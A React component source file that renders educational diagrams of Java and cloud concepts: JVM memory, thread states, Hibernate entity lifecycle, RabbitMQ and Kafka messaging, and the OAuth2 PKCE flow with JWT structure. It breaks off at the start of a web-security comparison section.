import { motion } from 'motion/react';
import {
  Layers,
  Activity,
  Server,
  Cpu,
  ShieldCheck,
  Database,
  Cloud,
  Zap,
  Boxes,
  Key,
  Lock,
  RefreshCw,
  AlertTriangle,
  ArrowRight,
  CheckCircle,
  Globe,
  Terminal,
  ShieldAlert,
  KeyRound,
  Shield
} from 'lucide-react';

export function VisualsView() {
  return (
    <div className="max-w-5xl mx-auto pb-12">
      <div className="mb-8">
        <div className="inline-block px-3 py-1 bg-indigo-100 text-indigo-800 text-xs font-semibold rounded-full mb-3 flex items-center gap-2 w-max">
          <Layers className="w-3 h-3" /> Architecture & Internals
        </div>
        <h1 className="text-3xl font-bold text-slate-900 mb-3">Java & Cloud Visual Concepts</h1>
        <p className="text-slate-600 text-lg leading-relaxed">
          Pictorial representations of complex Java architectures, JVM internals, RabbitMQ resiliency, OAuth2 / PKCE authentication flows, and Web Security mechanisms.
        </p>
      </div>

      <div className="space-y-12">
        {/* JVM Memory Model */}
        <section>
          <h2 className="text-2xl font-bold text-slate-900 mb-4 flex items-center gap-2">
            <Server className="w-6 h-6 text-indigo-600" /> JVM Memory Model (Java 8+)
          </h2>
          <div className="bg-white p-6 rounded-2xl border border-slate-200 shadow-sm">
            <div className="flex flex-col lg:flex-row gap-6">
              
              {/* Heap Area */}
              <div className="flex-1 bg-amber-50 rounded-xl p-4 border border-amber-200">
                <h3 className="font-bold text-amber-900 mb-3 text-center">Heap Memory (Shared)</h3>
                
                <div className="space-y-3">
                  <div className="bg-green-100 border border-green-300 rounded-lg p-3">
                    <h4 className="text-sm font-bold text-green-800 text-center mb-2">Young Generation</h4>
                    <div className="flex gap-2 text-xs">
                      <div className="flex-1 bg-white p-2 rounded text-center shadow-sm border border-green-200 text-green-700 font-medium">Eden Space<br/><span className="text-[10px] text-slate-500">New Objects</span></div>
                      <div className="flex-1 bg-white p-2 rounded text-center shadow-sm border border-green-200 text-green-700 font-medium">Survivor 0 (S0)</div>
                      <div className="flex-1 bg-white p-2 rounded text-center shadow-sm border border-green-200 text-green-700 font-medium">Survivor 1 (S1)</div>
                    </div>
                  </div>
                  
                  <div className="bg-blue-100 border border-blue-300 rounded-lg p-4 text-center">
                    <h4 className="text-sm font-bold text-blue-800 mb-1">Old Generation (Tenured)</h4>
                    <p className="text-xs text-blue-600">Long-lived objects promoted from Survivor spaces.</p>
                  </div>
                </div>
              </div>

              {/* Non-Heap Areas */}
              <div className="flex-1 flex flex-col gap-4">
                <div className="bg-purple-50 rounded-xl p-4 border border-purple-200 h-full">
                  <h3 className="font-bold text-purple-900 mb-2 text-center">Metaspace (Native Memory)</h3>
                  <div className="bg-white rounded-lg p-3 text-xs text-purple-700 text-center border border-purple-100 shadow-sm">
                    Class Definitions, Static Variables, Method Code, Constant Pool
                    <div className="mt-2 text-[10px] text-purple-500 italic">Replaced PermGen in Java 8. Grows dynamically in native OS memory.</div>
                  </div>
                </div>

                <div className="bg-slate-100 rounded-xl p-4 border border-slate-300 h-full">
                  <h3 className="font-bold text-slate-700 mb-2 text-center">Thread Area (Per Thread)</h3>
                  <div className="flex gap-2">
                    <div className="flex-1 bg-white rounded-lg p-2 text-xs text-slate-600 text-center border border-slate-200 shadow-sm">
                      <div className="font-bold mb-1">Thread Stack</div>
                      Local variables, method frames
                    </div>
                    <div className="flex-1 bg-white rounded-lg p-2 text-xs text-slate-600 text-center border border-slate-200 shadow-sm">
                      <div className="font-bold mb-1">PC Register</div>
                      Current instruction address
                    </div>
                  </div>
                </div>
              </div>

            </div>
          </div>
        </section>

        {/* Thread Lifecycle */}
        <section>
          <h2 className="text-2xl font-bold text-slate-900 mb-4 flex items-center gap-2">
            <Activity className="w-6 h-6 text-emerald-600" /> Thread Lifecycle states
          </h2>
          <div className="bg-white p-8 rounded-2xl border border-slate-200 shadow-sm overflow-x-auto">
            <div className="min-w-[700px] relative h-[250px] flex items-center justify-between">
              
              {/* Lines / Arrows */}
              <svg className="absolute inset-0 w-full h-full pointer-events-none" style={{ zIndex: 0 }}>
                <defs>
                  <marker id="arrow" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto">
                    <path d="M 0 0 L 10 5 L 0 10 z" fill="#94a3b8" />
                  </marker>
                </defs>
                <line x1="80" y1="125" x2="180" y2="125" stroke="#94a3b8" strokeWidth="2" markerEnd="url(#arrow)" />
                <line x1="280" y1="125" x2="480" y2="125" stroke="#94a3b8" strokeWidth="2" markerEnd="url(#arrow)" />
                
                {/* Runnable to Waiting */}
                <path d="M 230 160 Q 230 220 330 220" fill="none" stroke="#94a3b8" strokeWidth="2" markerEnd="url(#arrow)" />
                {/* Waiting to Runnable */}
                <path d="M 430 220 Q 530 220 530 160" fill="none" stroke="#94a3b8" strokeWidth="2" markerEnd="url(#arrow)" />
                
                {/* Runnable to Blocked */}
                <path d="M 230 90 Q 230 30 330 30" fill="none" stroke="#94a3b8" strokeWidth="2" markerEnd="url(#arrow)" />
                {/* Blocked to Runnable */}
                <path d="M 430 30 Q 530 30 530 90" fill="none" stroke="#94a3b8" strokeWidth="2" markerEnd="url(#arrow)" />
              </svg>

              {/* State 1: NEW */}
              <div className="relative z-10 flex flex-col items-center">
                <div className="w-20 h-20 rounded-full bg-slate-100 border-2 border-slate-300 flex items-center justify-center font-bold text-slate-700 shadow-sm">
                  NEW
                </div>
                <span className="text-[10px] text-slate-500 mt-2">Thread t = new Thread()</span>
              </div>

              {/* State 2: RUNNABLE */}
              <div className="relative z-10 flex flex-col items-center">
                <div className="w-24 h-24 rounded-full bg-emerald-50 border-2 border-emerald-400 flex flex-col items-center justify-center font-bold text-emerald-800 shadow-md">
                  <span>RUNNABLE</span>
                  <span className="text-[9px] font-normal text-emerald-600 mt-1">Ready / Running</span>
                </div>
                <span className="text-[10px] text-emerald-600 font-mono mt-2">t.start()</span>
              </div>

              {/* Middle Block: WAITING / BLOCKED */}
              <div className="flex flex-col gap-12 relative z-10">
                <div className="bg-amber-50 border-2 border-amber-300 p-3 rounded-xl shadow-sm text-center w-36">
                  <div className="font-bold text-amber-800 text-sm">BLOCKED</div>
                  <div className="text-[9px] text-amber-600 mt-1">Waiting for monitor lock</div>
                </div>
                <div className="bg-blue-50 border-2 border-blue-300 p-3 rounded-xl shadow-sm text-center w-36">
                  <div className="font-bold text-blue-800 text-sm">WAITING / TIMED</div>
                  <div className="text-[9px] text-blue-600 mt-1">wait(), join(), sleep()</div>
                </div>
              </div>

              {/* State 3: TERMINATED */}
              <div className="relative z-10 flex flex-col items-center">
                <div className="w-20 h-20 rounded-full bg-rose-50 border-2 border-rose-300 flex items-center justify-center font-bold text-rose-800 shadow-sm">
                  TERMINATED
                </div>
                <span className="text-[10px] text-slate-500 mt-2">run() completed</span>
              </div>

            </div>
          </div>
        </section>

        {/* Hibernate Entity Lifecycle */}
        <section>
          <h2 className="text-2xl font-bold text-slate-900 mb-4 flex items-center gap-2">
            <Database className="w-6 h-6 text-cyan-600" /> Hibernate / JPA Entity Lifecycle
          </h2>
          <div className="bg-white p-6 rounded-2xl border border-slate-200 shadow-sm">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-8 items-center">
              <div className="bg-slate-50 border border-slate-200 rounded-xl p-6 relative flex flex-col items-center min-h-[300px] justify-between">
                 
                 {/* Transient */}
                 <div className="bg-white border-2 border-slate-300 px-4 py-2 rounded-lg font-bold text-slate-700 shadow-sm">
                    Transient (new)
                 </div>
                 
                 <div className="w-px h-8 bg-slate-300 relative">
                   <div className="absolute top-1/2 -translate-y-1/2 left-2 bg-white px-1 text-[10px] text-slate-500 font-mono">persist() / save()</div>
                 </div>

                 {/* Persistent */}
                 <div className="bg-green-100 border-2 border-green-400 px-6 py-3 rounded-xl font-bold text-green-800 shadow-md text-center">
                    Persistent (Managed)
                    <div className="text-[10px] font-normal text-green-700">Tracked by EntityManager / Session</div>
                 </div>

                 <div className="flex justify-between w-full px-4 mt-6">
                    <div className="bg-orange-100 border-2 border-orange-300 p-2 rounded-lg font-bold text-orange-800 text-xs text-center w-28 shadow-sm">
                       Detached
                    </div>
                    <div className="bg-red-100 border-2 border-red-300 p-2 rounded-lg font-bold text-red-800 text-xs text-center w-28 shadow-sm">
                       Removed
                    </div>
                 </div>
              </div>
              
              <div className="space-y-3 flex flex-col justify-center">
                <div className="bg-white border border-slate-200 p-3 rounded-lg shadow-sm">
                  <h4 className="font-bold text-slate-800 text-sm flex items-center gap-2"><div className="w-3 h-3 rounded-full bg-slate-300"></div> Transient</h4>
                  <p className="text-[11px] text-slate-600 mt-1">Newly instantiated using <code>new</code>. Not associated with an EntityManager and has no DB representation.</p>
                </div>
                <div className="bg-green-50 border border-green-200 p-3 rounded-lg shadow-sm">
                  <h4 className="font-bold text-green-900 text-sm flex items-center gap-2"><div className="w-3 h-3 rounded-full bg-green-400"></div> Persistent (Managed)</h4>
                  <p className="text-[11px] text-green-800 mt-1">Associated with a persistence context. Changes are tracked by Hibernate (Dirty Checking) and saved on flush.</p>
                </div>
                <div className="bg-orange-50 border border-orange-200 p-3 rounded-lg shadow-sm">
                  <h4 className="font-bold text-orange-900 text-sm flex items-center gap-2"><div className="w-3 h-3 rounded-full bg-orange-300"></div> Detached</h4>
                  <p className="text-[11px] text-orange-800 mt-1">Was persistent, but the EntityManager was closed or cleared. Changes are no longer tracked. Needs <code>merge()</code> to be reattached.</p>
                </div>
                <div className="bg-red-50 border border-red-200 p-3 rounded-lg shadow-sm">
                  <h4 className="font-bold text-red-900 text-sm flex items-center gap-2"><div className="w-3 h-3 rounded-full bg-red-300"></div> Removed</h4>
                  <p className="text-[11px] text-red-800 mt-1">Scheduled for deletion from the database upon the next flush/commit.</p>
                </div>
              </div>
            </div>
          </div>
        </section>

        {/* RabbitMQ Core AMQP Architecture */}
        <section>
          <h2 className="text-2xl font-bold text-slate-900 mb-4 flex items-center gap-2">
            <Activity className="w-6 h-6 text-fuchsia-600" /> RabbitMQ Core Architecture (AMQP)
          </h2>
          <div className="bg-white p-6 rounded-2xl border border-slate-200 shadow-sm">
            <p className="text-sm text-slate-600 mb-6">
              RabbitMQ is a smart message broker. Producers publish to an <strong>Exchange</strong>, which routes messages to <strong>Queues</strong> based on bindings and routing keys. Messages are deleted from the queue once consumed (ACK&apos;d).
            </p>
            
            <div className="flex flex-col items-center max-w-4xl mx-auto">
              {/* Producer */}
              <div className="bg-slate-100 border-2 border-slate-300 p-3 rounded-xl shadow-sm z-10 w-48 text-center">
                 <div className="font-bold text-slate-700">Producer</div>
                 <div className="text-[10px] text-slate-500 mt-1">Routing Key: &quot;order.eu&quot;</div>
              </div>
              
              <div className="h-8 w-1 bg-slate-300 relative">
                 <div className="absolute bottom-0 left-1/2 -translate-x-1/2 translate-y-1/2 border-x-4 border-x-transparent border-t-4 border-t-slate-400"></div>
              </div>
              
              {/* Exchange */}
              <div className="bg-fuchsia-50 border-2 border-fuchsia-300 rounded-full w-48 h-24 flex flex-col items-center justify-center shadow-md z-10 relative">
                 <div className="font-bold text-fuchsia-800">Topic Exchange</div>
                 <div className="text-[10px] text-fuchsia-600">&quot;orders.exchange&quot;</div>
              </div>
              
              {/* Bindings */}
              <div className="flex w-full max-w-lg justify-between relative mt-8 mb-4">
                 
                 {/* Left Binding */}
                 <div className="flex flex-col items-center flex-1 relative">
                    <svg className="absolute bottom-full left-1/2 w-full h-16 pointer-events-none" style={{ transform: 'translateX(-50%)' }} preserveAspectRatio="none">
                      <path d="M 50% 0 C 50% 50%, 10% 50%, 10% 100%" fill="none" stroke="#cbd5e1" strokeWidth="2" strokeDasharray="4"/>
                      <polygon points="10%,100% 8%,90% 12%,90%" fill="#94a3b8" />
                    </svg>
                    <div className="bg-white border border-fuchsia-200 text-fuchsia-700 text-[10px] px-2 py-1 rounded-full absolute -top-8 left-[10%] -translate-x-1/2 shadow-sm font-mono font-bold">
                       Binding: &quot;order.eu&quot;
                    </div>
                 </div>
                 
                 {/* Right Binding */}
                 <div className="flex flex-col items-center flex-1 relative">
                    <svg className="absolute bottom-full right-1/2 w-full h-16 pointer-events-none" style={{ transform: 'translateX(50%)' }} preserveAspectRatio="none">
                      <path d="M 50% 0 C 50% 50%, 90% 50%, 90% 100%" fill="none" stroke="#cbd5e1" strokeWidth="2" strokeDasharray="4"/>
                      <polygon points="90%,100% 88%,90% 92%,90%" fill="#94a3b8" />
                    </svg>
                    <div className="bg-white border border-fuchsia-200 text-fuchsia-700 text-[10px] px-2 py-1 rounded-full absolute -top-8 right-[10%] translate-x-1/2 shadow-sm font-mono font-bold">
                       Binding: &quot;order.us&quot;
                    </div>
                 </div>
                 
              </div>
              
              {/* Queues & Consumers */}
              <div className="flex w-full max-w-lg justify-between">
                 <div className="flex flex-col items-center gap-4">
                    <div className="bg-white border-2 border-orange-300 p-2 rounded w-32 flex flex-col items-center shadow-sm relative">
                       <div className="bg-orange-100 text-orange-800 text-[10px] font-bold px-2 py-1 w-full text-center border-b border-orange-200">Queue (EU)</div>
                       <div className="flex gap-1 p-2">
                          <div className="w-4 h-4 bg-orange-200 rounded-sm"></div>
                          <div className="w-4 h-4 bg-orange-200 rounded-sm"></div>
                          <div className="w-4 h-4 bg-slate-100 rounded-sm border border-slate-200 border-dashed"></div>
                       </div>
                    </div>
                    <div className="h-4 w-1 bg-slate-300 relative">
                       <div className="absolute bottom-0 left-1/2 -translate-x-1/2 translate-y-1/2 border-x-4 border-x-transparent border-t-4 border-t-slate-400"></div>
                    </div>
                    <div className="bg-blue-50 border border-blue-200 p-2 rounded text-center w-32 shadow-sm">
                       <div className="text-xs font-bold text-blue-800">EU Consumer</div>
                       <div className="text-[9px] text-blue-600 mt-1">Sends ACK &gt; Msg Deleted</div>
                    </div>
                 </div>
                 
                 <div className="flex flex-col items-center gap-4">
                    <div className="bg-white border-2 border-orange-300 p-2 rounded w-32 flex flex-col items-center shadow-sm opacity-60">
                       <div className="bg-orange-100 text-orange-800 text-[10px] font-bold px-2 py-1 w-full text-center border-b border-orange-200">Queue (US)</div>
                       <div className="flex gap-1 p-2">
                          <div className="w-4 h-4 bg-slate-100 rounded-sm border border-slate-200 border-dashed"></div>
                          <div className="w-4 h-4 bg-slate-100 rounded-sm border border-slate-200 border-dashed"></div>
                       </div>
                       <div className="absolute -top-3 -right-3 bg-slate-600 text-white text-[8px] font-bold px-1 rounded">Empty</div>
                    </div>
                    <div className="h-4 w-1 bg-slate-300 relative opacity-60">
                       <div className="absolute bottom-0 left-1/2 -translate-x-1/2 translate-y-1/2 border-x-4 border-x-transparent border-t-4 border-t-slate-400"></div>
                    </div>
                    <div className="bg-blue-50 border border-blue-200 p-2 rounded text-center w-32 shadow-sm opacity-60">
                       <div className="text-xs font-bold text-blue-800">US Consumer</div>
                       <div className="text-[9px] text-blue-600 mt-1">Waiting...</div>
                    </div>
                 </div>
              </div>
              
            </div>
          </div>
        </section>

        {/* RabbitMQ Advanced Resiliency: DLX, Retry Queue & DLQ */}
        <section>
          <h2 className="text-2xl font-bold text-slate-900 mb-4 flex items-center gap-2">
            <RefreshCw className="w-6 h-6 text-rose-600" /> RabbitMQ Resiliency: DLX &amp; Exponential Retry Architecture
          </h2>
          <div className="bg-white p-6 rounded-2xl border border-slate-200 shadow-sm">
            <p className="text-sm text-slate-600 mb-6">
              When processing fails, the consumer rejects the message with <code>basicNack(deliveryTag, false, false)</code>. RabbitMQ forwards it to a <strong>Dead Letter Exchange (DLX)</strong>, holding it in a delayed <strong>Retry Queue (TTL)</strong> before re-attempting processing, and finally quarantining poisoned messages in the <strong>DLQ</strong>.
            </p>

            <div className="bg-slate-50 border border-slate-200 rounded-xl p-6 relative max-w-4xl mx-auto overflow-x-auto">
              <div className="min-w-[750px] flex flex-col gap-6">
                
                {/* Step 1: Main Flow */}
                <div className="flex items-center justify-between gap-4">
                  <div className="bg-indigo-50 border-2 border-indigo-300 p-3 rounded-xl w-36 text-center shadow-sm">
                    <div className="text-xs font-bold text-indigo-900">Publisher</div>
                    <div className="text-[9px] text-indigo-600 mt-1">ConfirmCallback (ACK/NACK)</div>
                  </div>

                  <div className="flex items-center text-slate-400 text-xs font-mono">
                    <span className="bg-white px-2 py-0.5 border rounded text-[10px]">publish</span>
                    <ArrowRight className="w-4 h-4 ml-1" />
                  </div>

                  <div className="bg-purple-50 border-2 border-purple-300 p-3 rounded-xl w-40 text-center shadow-sm">
                    <div className="text-xs font-bold text-purple-900">Main Topic Exchange</div>
                    <div className="text-[9px] text-purple-600 font-mono mt-1">payment.exchange</div>
                  </div>

                  <div className="flex items-center text-slate-400 text-xs font-mono">
                    <ArrowRight className="w-4 h-4" />
                  </div>

                  <div className="bg-green-50 border-2 border-green-300 p-3 rounded-xl w-44 text-center shadow-sm">
                    <div className="text-xs font-bold text-green-900">Main Queue</div>
                    <div className="text-[9px] text-green-700 font-mono mt-1">x-dead-letter-exchange</div>
                  </div>

                  <div className="flex items-center text-slate-400 text-xs font-mono">
                    <ArrowRight className="w-4 h-4" />
                  </div>

                  <div className="bg-blue-50 border-2 border-blue-300 p-3 rounded-xl w-36 text-center shadow-sm">
                    <div className="text-xs font-bold text-blue-900">Consumer</div>
                    <div className="text-[9px] text-rose-600 font-bold mt-1">Throws Exception!</div>
                  </div>
                </div>

                {/* Step 2: Failure & DLX Routing */}
                <div className="border-t-2 border-dashed border-rose-200 pt-4 grid grid-cols-3 gap-6 items-center">
                  
                  <div className="bg-rose-50 border-2 border-rose-300 p-3 rounded-xl text-center shadow-sm">
                    <div className="text-xs font-bold text-rose-900 flex items-center justify-center gap-1">
                      <AlertTriangle className="w-3.5 h-3.5 text-rose-600" /> DLX (Dead Letter Exchange)
                    </div>
                    <div className="text-[9px] text-rose-700 mt-1">Direct Exchange: &quot;payment.dlx&quot;</div>
                  </div>

                  <div className="bg-amber-50 border-2 border-amber-300 p-3 rounded-xl text-center shadow-sm relative">
                    <div className="absolute -top-2.5 left-1/2 -translate-x-1/2 bg-amber-200 text-amber-900 text-[9px] font-bold px-2 py-0.5 rounded-full">
                      Delayed Retry (5000ms TTL)
                    </div>
                    <div className="text-xs font-bold text-amber-900 mt-2">Retry Delay Queue</div>
                    <div className="text-[9px] text-amber-700 mt-1">No Consumers attached. Message expires &gt; routes back to Main Exchange.</div>
                  </div>

                  <div className="bg-red-100 border-2 border-red-400 p-3 rounded-xl text-center shadow-md">
                    <div className="text-xs font-bold text-red-900 flex items-center justify-center gap-1">
                      <ShieldAlert className="w-3.5 h-3.5 text-red-600" /> Poison DLQ (Quarantine)
                    </div>
                    <div className="text-[9px] text-red-700 mt-1">Max Retries Exceeded (3x). Alert sent to PagerDuty/Slack for triage.</div>
                  </div>

                </div>

              </div>
            </div>
            
            <div className="mt-4 grid grid-cols-3 gap-3 text-center text-xs">
              <div className="bg-slate-50 p-2 rounded border border-slate-200">
                <span className="font-bold text-slate-800">1. Non-blocking Retries:</span> Unhealthy messages do not block healthy traffic.
              </div>
              <div className="bg-slate-50 p-2 rounded border border-slate-200">
                <span className="font-bold text-slate-800">2. Exponential Backoff:</span> Increases delay (5s, 30s, 5m) via x-death header.
              </div>
              <div className="bg-slate-50 p-2 rounded border border-slate-200">
                <span className="font-bold text-slate-800">3. DLQ Replay:</span> Messages can be replayed after fixing downstream bugs.
              </div>
            </div>
          </div>
        </section>

        {/* Kafka Architecture */}
        <section>
          <h2 className="text-2xl font-bold text-slate-900 mb-4 flex items-center gap-2">
            <Layers className="w-6 h-6 text-orange-600" /> Apache Kafka Event Streaming
          </h2>
          <div className="bg-white p-6 rounded-2xl border border-slate-200 shadow-sm">
            <p className="text-sm text-slate-600 mb-6">
              Unlike RabbitMQ (which deletes messages once consumed), Kafka stores events in an append-only log partitioned across brokers. Multiple consumer groups can read the same events independently by tracking their own offsets.
            </p>
            
            <div className="flex flex-col md:flex-row gap-6 items-stretch max-w-4xl mx-auto">
              {/* Producers */}
              <div className="flex flex-col justify-center gap-4">
                <div className="bg-white border-2 border-slate-300 p-3 rounded-xl text-center shadow-sm">
                  <div className="font-bold text-slate-700 text-sm">Producer A</div>
                  <div className="text-[10px] text-slate-500 mt-1">Key: &quot;user-123&quot;</div>
                </div>
                <div className="bg-white border-2 border-slate-300 p-3 rounded-xl text-center shadow-sm">
                  <div className="font-bold text-slate-700 text-sm">Producer B</div>
                  <div className="text-[10px] text-slate-500 mt-1">Key: &quot;user-456&quot;</div>
                </div>
              </div>
              
              <div className="flex-1 bg-orange-50 border-2 border-orange-200 rounded-xl p-4 relative shadow-sm">
                 <div className="text-xs font-bold text-orange-800 absolute -top-3 left-1/2 -translate-x-1/2 bg-orange-100 px-3 py-1 rounded shadow-sm">Kafka Topic: &quot;orders&quot;</div>
                 
                 <div className="space-y-4 mt-2">
                   <div className="bg-white border border-orange-300 p-2 rounded flex items-center">
                     <div className="bg-orange-200 text-orange-800 font-bold text-[10px] px-2 py-4 rounded-l h-full">Partition 0</div>
                     <div className="flex-1 flex gap-1 px-2 overflow-hidden">
                       <div className="w-8 h-8 bg-blue-100 border border-blue-300 flex items-center justify-center text-[10px] text-blue-800">1</div>
                       <div className="w-8 h-8 bg-blue-100 border border-blue-300 flex items-center justify-center text-[10px] text-blue-800">2</div>
                       <div className="w-8 h-8 bg-blue-100 border border-blue-300 flex items-center justify-center text-[10px] text-blue-800">3</div>
                       <div className="w-8 h-8 bg-slate-100 border border-slate-300 flex items-center justify-center text-[10px] text-slate-400 border-dashed"></div>
                     </div>
                   </div>
                   
                   <div className="bg-white border border-orange-300 p-2 rounded flex items-center">
                     <div className="bg-orange-200 text-orange-800 font-bold text-[10px] px-2 py-4 rounded-l h-full">Partition 1</div>
                     <div className="flex-1 flex gap-1 px-2 overflow-hidden">
                       <div className="w-8 h-8 bg-green-100 border border-green-300 flex items-center justify-center text-[10px] text-green-800">1</div>
                       <div className="w-8 h-8 bg-green-100 border border-green-300 flex items-center justify-center text-[10px] text-green-800">2</div>
                       <div className="w-8 h-8 bg-slate-100 border border-slate-300 flex items-center justify-center text-[10px] text-slate-400 border-dashed"></div>
                     </div>
                   </div>
                 </div>
              </div>
              
              {/* Consumers */}
              <div className="flex flex-col justify-center gap-4">
                <div className="bg-blue-50 border-2 border-blue-200 p-3 rounded-xl shadow-sm relative">
                  <div className="text-[10px] font-bold text-blue-800 absolute -top-2 left-2 bg-white px-1">Consumer Grp A</div>
                  <div className="mt-2 text-center text-sm font-bold text-blue-900">Inventory Service</div>
                  <div className="text-[10px] text-blue-700 text-center mt-1">Offset: P0(3), P1(2)</div>
                </div>
                <div className="bg-green-50 border-2 border-green-200 p-3 rounded-xl shadow-sm relative">
                  <div className="text-[10px] font-bold text-green-800 absolute -top-2 left-2 bg-white px-1">Consumer Grp B</div>
                  <div className="mt-2 text-center text-sm font-bold text-green-900">Shipping Service</div>
                  <div className="text-[10px] text-green-700 text-center mt-1">Offset: P0(1), P1(1)</div>
                </div>
              </div>
            </div>
            
            <div className="mt-6 flex flex-wrap gap-2 justify-center">
               <span className="bg-slate-100 text-slate-700 text-xs px-3 py-1 rounded-full border border-slate-200">Messages are persisted</span>
               <span className="bg-slate-100 text-slate-700 text-xs px-3 py-1 rounded-full border border-slate-200">Consumers track offsets</span>
               <span className="bg-slate-100 text-slate-700 text-xs px-3 py-1 rounded-full border border-slate-200">Keys guarantee partition order</span>
            </div>
          </div>
        </section>

        {/* OAuth 2.0 & OpenID Connect Architecture */}
        <section>
          <h2 className="text-2xl font-bold text-slate-900 mb-4 flex items-center gap-2">
            <KeyRound className="w-6 h-6 text-sky-600" /> OAuth 2.0 Auth Code Flow with PKCE &amp; Okta IdP
          </h2>
          <div className="bg-white p-6 rounded-2xl border border-slate-200 shadow-sm">
            <p className="text-sm text-slate-600 mb-6">
              Modern Single-Page Applications (React/Angular) authenticate users via an <strong>Identity Provider (Okta / Keycloak)</strong> using the <strong>Authorization Code Grant with PKCE</strong>. The Spring Boot Resource Server verifies the JWT signature statelessly via cached JWKS keys.
            </p>

            <div className="bg-slate-50 border border-slate-200 rounded-xl p-6 max-w-4xl mx-auto overflow-x-auto">
              <div className="min-w-[760px] space-y-6">
                
                {/* Actors Header */}
                <div className="grid grid-cols-4 gap-4 text-center">
                  <div className="bg-white border-2 border-slate-300 p-2.5 rounded-xl shadow-sm">
                    <div className="font-bold text-xs text-slate-800">User / Browser</div>
                    <div className="text-[9px] text-slate-500">Resource Owner</div>
                  </div>
                  <div className="bg-sky-50 border-2 border-sky-300 p-2.5 rounded-xl shadow-sm">
                    <div className="font-bold text-xs text-sky-900">SPA Frontend (React)</div>
                    <div className="text-[9px] text-sky-600">Public OAuth Client</div>
                  </div>
                  <div className="bg-purple-50 border-2 border-purple-300 p-2.5 rounded-xl shadow-sm">
                    <div className="font-bold text-xs text-purple-900">Okta IdP</div>
                    <div className="text-[9px] text-purple-600">Authorization Server</div>
                  </div>
                  <div className="bg-emerald-50 border-2 border-emerald-300 p-2.5 rounded-xl shadow-sm">
                    <div className="font-bold text-xs text-emerald-900">Spring Boot API</div>
                    <div className="text-[9px] text-emerald-600">Resource Server</div>
                  </div>
                </div>

                {/* Sequence Steps */}
                <div className="space-y-3 text-xs">
                  {/* Step 1 */}
                  <div className="bg-white p-3 rounded-lg border border-slate-200 flex items-center justify-between shadow-sm">
                    <div className="flex items-center gap-3">
                      <span className="w-5 h-5 bg-sky-100 text-sky-800 rounded-full font-bold flex items-center justify-center text-[10px]">1</span>
                      <span className="font-semibold text-slate-800">Generate PKCE Pair</span>
                    </div>
                    <span className="text-slate-600 text-[11px] font-mono">code_verifier + code_challenge = SHA256(verifier)</span>
                  </div>

                  {/* Step 2 */}
                  <div className="bg-white p-3 rounded-lg border border-slate-200 flex items-center justify-between shadow-sm">
                    <div className="flex items-center gap-3">
                      <span className="w-5 h-5 bg-purple-100 text-purple-800 rounded-full font-bold flex items-center justify-center text-[10px]">2</span>
                      <span className="font-semibold text-slate-800">Redirect to Okta Login</span>
                    </div>
                    <span className="text-slate-600 text-[11px] font-mono">GET /oauth2/v1/authorize?code_challenge=...&amp;response_type=code</span>
                  </div>

                  {/* Step 3 */}
                  <div className="bg-white p-3 rounded-lg border border-slate-200 flex items-center justify-between shadow-sm">
                    <div className="flex items-center gap-3">
                      <span className="w-5 h-5 bg-purple-100 text-purple-800 rounded-full font-bold flex items-center justify-center text-[10px]">3</span>
                      <span className="font-semibold text-slate-800">Okta Issues Auth Code</span>
                    </div>
                    <span className="text-slate-600 text-[11px] font-mono">Redirects to SPA with ?code=auth_code_xyz</span>
                  </div>

                  {/* Step 4 */}
                  <div className="bg-white p-3 rounded-lg border border-slate-200 flex items-center justify-between shadow-sm">
                    <div className="flex items-center gap-3">
                      <span className="w-5 h-5 bg-purple-100 text-purple-800 rounded-full font-bold flex items-center justify-center text-[10px]">4</span>
                      <span className="font-semibold text-slate-800">Exchange Code + Verifier</span>
                    </div>
                    <span className="text-slate-600 text-[11px] font-mono">POST /token (code + plain code_verifier) &gt; Okta returns JWT Access Token</span>
                  </div>

                  {/* Step 5 */}
                  <div className="bg-white p-3 rounded-lg border border-emerald-200 flex items-center justify-between shadow-sm bg-emerald-50/50">
                    <div className="flex items-center gap-3">
                      <span className="w-5 h-5 bg-emerald-100 text-emerald-800 rounded-full font-bold flex items-center justify-center text-[10px]">5</span>
                      <span className="font-semibold text-slate-800">Access API with Bearer JWT</span>
                    </div>
                    <span className="text-emerald-700 text-[11px] font-mono">Authorization: Bearer &lt;JWT&gt;</span>
                  </div>

                  {/* Step 6 */}
                  <div className="bg-white p-3 rounded-lg border border-emerald-200 flex items-center justify-between shadow-sm bg-emerald-50/50">
                    <div className="flex items-center gap-3">
                      <span className="w-5 h-5 bg-emerald-100 text-emerald-800 rounded-full font-bold flex items-center justify-center text-[10px]">6</span>
                      <span className="font-semibold text-slate-800">Spring Security JWT Validation</span>
                    </div>
                    <span className="text-emerald-700 text-[11px]">Validates RS256 Signature via cached JWKS + Checks exp &amp; scopes</span>
                  </div>
                </div>

              </div>
            </div>

            {/* JWT Breakdown */}
            <div className="mt-6 border border-slate-200 rounded-xl p-4 bg-slate-50">
              <div className="text-xs font-bold text-slate-800 mb-2 flex items-center gap-1.5">
                <Key className="w-4 h-4 text-amber-600" /> Anatomical Structure of a JSON Web Token (JWT)
              </div>
              <div className="grid grid-cols-3 gap-3 text-xs">
                <div className="bg-rose-50 border border-rose-200 p-2.5 rounded-lg">
                  <div className="font-bold text-rose-800 font-mono text-[11px]">1. Header (Base64Url)</div>
                  <div className="text-[10px] text-rose-700 mt-1 font-mono">{`{"alg": "RS256", "kid": "okta-key-1"}`}</div>
                </div>
                <div className="bg-purple-50 border border-purple-200 p-2.5 rounded-lg">
                  <div className="font-bold text-purple-800 font-mono text-[11px]">2. Payload (Claims)</div>
                  <div className="text-[10px] text-purple-700 mt-1 font-mono">{`{"sub": "usr_99", "roles": ["ADMIN"], "exp": 172000}`}</div>
                </div>
                <div className="bg-sky-50 border border-sky-200 p-2.5 rounded-lg">
                  <div className="font-bold text-sky-800 font-mono text-[11px]">3. Signature</div>
                  <div className="text-[10px] text-sky-700 mt-1 font-mono">RSASHA256(header.payload, privateKey)</div>
                </div>
              </div>
            </div>
          </div>
        </section>

        {/* Web Security Triad: CSRF vs XSS vs CORS */}
        <section>
          <h2 className="text-2xl font-bold text-slate-900 mb-4 flex items-center gap-2">
            <Shield className="w-6 h-6 text-violet-600" /> Web Security Triad: CSRF vs XSS vs CORS
          </h2>
          <div className="bg-white p-6 rounded-2xl border border-slate-200 shadow-sm">
            <p className="text-sm text-slate-600 mb-6">
              A side-by-side comparison of the three fundamental web application security mechanisms, their browser execution rules, and Spring Boot / enterprise defenses.
            </p>

            <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
              
              {/* CSRF Card */}
